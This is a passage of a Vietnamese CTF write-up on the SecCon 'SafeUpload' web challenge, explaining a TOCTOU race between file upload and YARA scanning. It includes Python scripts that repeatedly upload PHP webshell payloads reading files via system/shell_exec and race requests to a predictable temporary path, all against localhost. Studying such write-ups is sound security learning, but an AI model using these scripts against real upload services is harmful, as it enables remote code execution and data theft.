<p>Chạy yara để kiểm tra file có phải mã độc không nó sẽ ghi kết quả vào <code>$out</code> và mã trả về vào <code>$ret</code>.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stdout</span>   = <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$ruleName</span> = <span class="string">&#x27;Suspicious_there_is_no_such_text_string_in_the_image&#x27;</span>;</span><br><span class="line"><span class="variable">$hitByName</span> = (<span class="title function_ invoke__">strpos</span>(<span class="variable">$stdout</span>, <span class="variable">$ruleName</span>) !== <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>Gộp đầu ra thành chuỗi.</li>
<li>Kiểm tra nếu rule tên ‘Suspicious_there_is_no_such_text_string_in_the_image’ có bị match không.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$ret</span> === <span class="number">1</span> || <span class="variable">$hitByName</span>) &#123;</span><br><span class="line">  @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp_path</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Upload scanned: MALWARE detected. File removed.&lt;br&gt;&lt;a href=/&gt;back&lt;/a&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Xử lý file theo kết quả của yara scan trả về nếu <code>$ret==1</code> thì file upload trên sẽ bị xoá.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$ret</span> === <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="variable">$dst</span> = <span class="variable">$DST_DIR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$tmp_path</span>);</span><br><span class="line">  <span class="keyword">if</span> (!@<span class="title function_ invoke__">rename</span>(<span class="variable">$tmp_path</span>, <span class="variable">$dst</span>)) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">copy</span>(<span class="variable">$tmp_path</span>, <span class="variable">$dst</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp_path</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Upload scanned: OK. Moved to &lt;a href=./uploads/&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$dst</span>)) . <span class="string">&quot;&gt;View Guide&lt;/a&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Với điều kiện <code>$ret==0</code> thì sẽ đưa file đó từ <code>/tmp</code> sang thư mục <code>/uploads</code> và hiển thị link để truy cập file đó.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp_path</span>);</span><br><span class="line">  <span class="title function_ invoke__">bad</span>(<span class="string">&#x27;scan error&#x27;</span>,<span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Trong trường hợp yara trả về khác 0&#x2F;1 thì sẽ trả về lỗi này.</p>
<h4 id="Debug-va-POC"><a href="#Debug-va-POC" class="headerlink" title="Debug và POC"></a>Debug và POC</h4><p>Với bài này vì không chắc là liệu bên phía backend có thực thi file đuôi php không nên tôi sẽ tiến hành debug trên docker.</p>
<p><img src="https://hackmd.io/_uploads/HyTjFxwiee.png" alt="image"></p>
<p>Tiến hành đưa file shell.php vào thư mục <code>/uploads</code>.</p>
<p><img src="https://hackmd.io/_uploads/Bk7CYxwjgx.png" alt="image"></p>
<p>Truy cập vào <code>/uploads/shell.php</code> có thể thấy php đã được thực thi nên ta có thể nhận định rằng server có thực thi file đuôi <code>php</code>.</p>
<p>Vậy hướng khai thác bài này ở đây là gì, ở đây sau khi tìm hiểu thì tôi nhận thấy lớp filter của yara khá là dày và sẽ rất khó có thể bypass qua được nên tôi tìm thêm hướng khai thác khác.</p>
<p>Sau khi đọc lại code tôi thấy có dòng:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">800</span> * <span class="number">1000</span>); <span class="comment">// 800ms</span></span><br></pre></td></tr></table></figure>

<p>Ở đây theo tôi hiểu thì trước khi yara tiến hành scan thì sẽ có 1 khoảng thời gian sleep là vào khoảng 800ms hay 0.8 giây, vậy liệu ta có thể lợi dụng khoảng thời ngắn này để làm được việc gì không?</p>
<p>Sau khi tìm hiểu thì có phương pháp TOCTOU (Time-of-check to Time-of-use) là một loại lỗi phổ biến trong các tình huống race condition, nơi có sự không đồng bộ giữa quá trình kiểm tra và sử dụng tài nguyên (hoặc dữ liệu) trong một hệ thống.</p>
<p>Giải thích TOCTOU:</p>
<p>TOCTOU xảy ra khi có một sự khác biệt giữa thời điểm khi một điều kiện được kiểm tra và thời điểm khi điều kiện đó thực sự được sử dụng. Trong một hệ thống nhiều tiến trình (multi-threaded) hoặc có sự truy cập đồng thời (concurrent access), một tiến trình có thể kiểm tra một điều kiện (ví dụ: một file có tồn tại hay không) nhưng trong khoảng thời gian giữa lúc kiểm tra và lúc sử dụng tài nguyên đó, tài nguyên có thể đã thay đổi bởi một tiến trình khác.</p>
<p>Ví dụ về TOCTOU:</p>
<p>Giả sử bạn có một đoạn mã kiểm tra nếu một file tồn tại, sau đó tiến hành sử dụng file đó (ví dụ, đọc nội dung). Nếu trong khoảng thời gian giữa việc kiểm tra sự tồn tại của file và việc sử dụng nó, một tiến trình khác đã thay đổi trạng thái của file (ví dụ: xóa file, thay đổi quyền truy cập file, hoặc ghi đè lên file), thì có thể dẫn đến kết quả không mong muốn hoặc hành vi không xác định.</p>
<p>Vậy bây giờ kịch bản đưa ra sẽ là ta sẽ cố gắng lợi dụng thời gian 800ms đó để có thể thực thi cat flag ra và in nó ra vì như ở trên ta đã thử debug web server hoàn toàn có thể tự thực thi <code>php</code> và ta sẽ cố định tên file sẽ là <code>0089.php</code> vì như đoạn code đã được phân tích trên tên file khi nó di chuyển vào &#x2F;tmp sẽ được random nên ta sẽ cố định nó lại và chạy nhiều cặp request nhưng trước hết ta sẽ thử debug.</p>
<p>Ta sẽ tiến hành sử dụng burp proxy cùng với đó là script để thử 1 cặp request GET và POST:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Burp Suite Proxy (enable &quot;Intercept&quot; in Burp first)</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Target URL and predictable filename</span></span><br><span class="line">UPLOAD_URL = <span class="string">&quot;http://localhost:8001/upload.php&quot;</span></span><br><span class="line">FILENAME = <span class="string">&quot;payload.php&quot;</span>  <span class="comment"># Fixed 4-digit name</span></span><br><span class="line">PAYLOAD = <span class="string">b&#x27;&lt;?php system(&quot;cat /*.txt&quot;); ?&gt;&#x27;</span>  <span class="comment"># Simple payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare the file upload</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (FILENAME, PAYLOAD)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.post(</span><br><span class="line">        UPLOAD_URL,</span><br><span class="line">        files=files,</span><br><span class="line">        proxies=proxies,  <span class="comment"># Remove this line to skip Burp</span></span><br><span class="line">        verify=<span class="literal">False</span>  <span class="comment"># Skip SSL verification if needed</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;POST Response (<span class="subst">&#123;response.status_code&#125;</span>):\n<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;POST Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Burp Suite Proxy</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Predictable access URL</span></span><br><span class="line">EXPLOIT_URL = <span class="string">f&quot;http://localhost:8001/tmp/0089.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(</span><br><span class="line">        EXPLOIT_URL,</span><br><span class="line">        proxies=proxies,  <span class="comment"># Remove to skip Burp</span></span><br><span class="line">        verify=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;GET Response (<span class="subst">&#123;response.status_code&#125;</span>):\n<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;GET Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/ryTI2bvsxl.png" alt="image"></p>
<p>Tiến hành chạy POST ở đây burp đã bắt được đoạn upload lên bây giờ ta sẽ chạy GET và forward xem nó sẽ trả về gì.</p>
<p><img src="https://hackmd.io/_uploads/B1eRsh-vixx.png" alt="image"></p>
<p>Sau khi forward có thể thấy GET vẫn được trả về nhưng kết quả sẽ là 404 vì ở đây nó sẽ random ra file khác nên nếu chưa trùng tên thì kết quả sẽ không ra bây giờ ta sẽ thử script khai thác.</p>
<p>Ở đây tôi sẽ viết script sẽ gửi POST và GET request sẽ xảy ra nhanh nghĩa là sau khi POST file php lên thì ngay lập tức gửi GET request để lấy nội dung và với vấn đề về đoạn random ở tên file trong thư mục <code>/tmp</code> thì mình sẽ để cố định dãy số nào đó <code>(vd : 0086.php)</code> và lặp đi lặp lại quá trình request đến khi nó chạm đúng vào file <code>0086.php</code> và lấy được flag ở đây mình tạo 10001 request và chờ thôi nếu nhân phẩm tốt thì flag sẽ ra sớm còn không thì chờ.</p>
<p><img src="https://hackmd.io/_uploads/HkeRZn0wsgl.png" alt="image"></p>
<p>Kiểm tra trong burp xem proxy có hiển thị đủ 2 request không, ở đây nó sẽ liên tục tạo từng cặp POST và GET nên không lo về vấn đề time.</p>
<p>Code Exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line"><span class="comment"># Biến flag để kiểm tra xem có sử dụng proxy hay không</span></span><br><span class="line">USE_PROXY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Proxy nếu cần debug</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line">&#125; <span class="keyword">if</span> USE_PROXY <span class="keyword">else</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">rand_num = <span class="string">&quot;0058&quot;</span>  <span class="comment"># Số này có thể thay đổi theo yêu cầu của bạn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hàm upload shell</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_shell</span>(<span class="params">rand_num</span>):</span><br><span class="line">    url = <span class="string">&quot;http://localhost:8001/upload.php&quot;</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;&lt;?php echo shell_exec(&#x27;cat /*&#x27;); ?&gt;&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, files=files, timeout=<span class="number">5</span>, proxies=proxies)</span><br><span class="line">        <span class="keyword">return</span> r.status_code</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;upload error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hàm kiểm tra flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_read</span>():</span><br><span class="line">    url = <span class="string">f&quot;http://localhost:8001/tmp/<span class="subst">&#123;rand_num&#125;</span>.php&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">5</span>, proxies=proxies)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;cyber&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">return</span> r.text.strip()  <span class="comment"># Trả về flag nếu tìm thấy</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hàm chạy song song POST và GET với nhiều threads</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop_until_flag</span>(<span class="params">max_requests=<span class="number">10000</span></span>):</span><br><span class="line">    total_requests = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">100</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="keyword">while</span> total_requests &lt; max_requests:</span><br><span class="line">            futures_upload = [executor.submit(upload_shell, rand_num) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">            futures_read = [executor.submit(try_read) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]  <span class="comment"># Kiểm tra flag với 50 threads</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Chờ tất cả các task (futures) trong futures_upload hoàn thành</span></span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> as_completed(futures_upload):</span><br><span class="line">                res = f.result()</span><br><span class="line">                total_requests += <span class="number">1</span>  <span class="comment"># Cập nhật số lượng request đã gửi</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Upload result: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Kiểm tra kết quả từ futures_read</span></span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> as_completed(futures_read):</span><br><span class="line">                res = f.result()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(res, <span class="built_in">str</span>) <span class="keyword">and</span> <span class="string">&quot;cyber&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Found the flag at attempt <span class="subst">&#123;total_requests&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Found flag: <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> res  <span class="comment"># Dừng lại khi tìm thấy flag</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Attempt <span class="subst">&#123;total_requests&#125;</span>/<span class="subst">&#123;max_requests&#125;</span> - No flag found yet.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Finished <span class="subst">&#123;max_requests&#125;</span> requests without finding the flag.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    loop_until_flag(<span class="number">10000</span>)  <span class="comment"># Chạy cho đến khi gửi hết 10,000 requests hoặc tìm thấy flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Thành công lấy được flag.</p>
<p><img src="https://hackmd.io/_uploads/rkpa77uolx.png" alt="image"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/">https://pzhat.github.io/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-09-19-Path-Traversal-Servlet/" title="Java Servlet Path Traversal vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Java Servlet Path Traversal vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet Path Traversal vulnerabilitySource Code:[Github Link] Overview Đây là chức năng hiển thị hình ảnh của các file đã nằm trong folder images.  Ở đây ta test file skibidi.jpg và request nó sẽ hiển thị lên cho ta.  Đây là nơi chứa các file có thể hiển thị. Vì là build trên môi trường windows localhost qua apache tôi sẽ tạo một thư mục /protected có chứa file bí mật.  Tiến hành khai thác và POCLevel 1:123456789101112131415161718192021private void handleLevel1(String fileName, HttpServl...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-26-WebSecFr-Level1/" title="WebSec.fr level 1 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr level 1 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr level 1 CTF challengeOverview Giao diện chức năng của level này ta có thể thấy nó là một web app có chức năng hiển thị username bằng cách nhập vào userID nên bước đầu ta có thể nghi ngờ nó dính Sql Injection. Phân tích source code123456789101112131415161718192021222324252627282930313233&lt;?phpsession_start ();ini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);ini_set(&#x27;error_reporting&#x27;, E_ALL);include &#x27;anti_csrf.php&#x27;;init_token ();class LevelOne &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-15-CBJS-Java-Deserialize/" title="Java Deserialize CBJS Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Deserialize CBJS Lab</div></div><div class="info-2"><div class="info-item-1">Java Deserialize CBJS LabGiải thích chi tiết về lỗ hổng Deserialization1. Deserialization là gì?  Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền tải (như byte stream, JSON, XML).  Deserialization là quá trình ngược lại - chuyển đổi dữ liệu đã được serialize trở lại thành object trong bộ nhớ.   2. Nguyên nhân Lỗ hổng xảy ra khi:  Ứng dụng deserialize dữ liệu từ nguồn không tin cậy (user input, network). Không có validati...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/" title="Spring Time CTF challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Spring Time CTF challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">Spring Time CTF challenge WriteUp Web App được chia làm 2 services khác nhau bao gồm:  gateman : port 8080 newsman : port 8082  Phân tích từng chức năng từng service Gateman   Nó được chạy bằng port 8080 bên cạnh đó nó còn gọi cloud cùng với đó là expose include ra các chức năng như health , info , gateway. Vậy nên có thể biết được đây là service Spring Cloud với chức năng routing đến các routes.  Newsman  Ta sẽ đi thẳng vào luôn đầu tiên là NewsController.class:  1234567891011121314151617181...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a 